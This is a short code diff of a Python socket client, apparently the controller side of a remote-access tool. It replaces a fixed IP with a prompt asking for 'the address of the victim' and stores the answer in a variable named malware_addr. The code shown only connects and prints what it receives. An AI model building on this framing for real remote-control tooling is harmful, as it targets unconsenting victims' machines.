@@ -36,7 +36,8 @@ class GetInfo:
         content = s.recv(4096).decode("utf-8")
         print(content)
 
-serv_addr = ("192.168.1.25", 12345)
+malware_addr = input("Enter the address of the victim: ")
+serv_addr = (malware_addr, 12345)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(serv_addr)
 print(s.recv(4096))
@@ -66,3 +67,4 @@ while message != "exit":
 
 
 s.close()
+
